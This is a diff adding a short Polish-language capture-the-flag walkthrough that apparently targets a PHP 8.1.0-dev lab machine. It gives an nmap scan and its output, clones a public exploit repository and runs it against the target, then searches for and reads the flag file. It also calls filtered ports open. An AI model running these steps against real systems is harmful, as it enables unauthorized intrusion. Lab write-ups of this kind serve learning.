@@ -1,0 +1,47 @@
+Exploit dla PHP 8.1.0-dev
+
+*Enumeracja za pomoca nmap:*
+```python
+sudo nmap -sC -sV -A -O -Pn 10.10.118.48
+
+map scan report for 10.10.118.48
+Host is up (0.20s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE    SERVICE VERSION
+80/tcp   open     http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
+|_http-title:  Admin Dashboard
+90/tcp   filtered dnsix
+5925/tcp filtered unknown
+```
+
+Nmap pokazał iż porty 80, 90, 5925 są otwarte. 
+
+*Serwer WWW działa na porcie 80 wiec w przglądarce należy wpisać:*
+```python
+http://10.10.118.48:80
+```
+
+Otworzyła się strona internetowa w której można spróbować 
+wprowadzanie danych przez użytkownika.
+
+Poszukuje wersji exploita dla PHP 8.1.0-dev
+
+Znalazłem exploita dla tej wersji:
+https://github.com/musyoka101/PHP-8.1.0-dev-Exploit
+
+*Teraz należy sklonować repozytorium za pomoca komendy:*
+```python
+git clone https://github.com/musyoka101/PHP-8.1.0-dev-Exploit
+```
+
+*Teraz należy uruchomić exploita:*
+```python
+python3 exploit.py http://10.10.118.48/
+```
+
+Kod się wykonał i otrzyałem dostęp do maszyny.
+*Następnie należy pobrać flagę:*
+```python
+find / -name flag.txt 2>/dev/null
+cat /flag.txt
+```
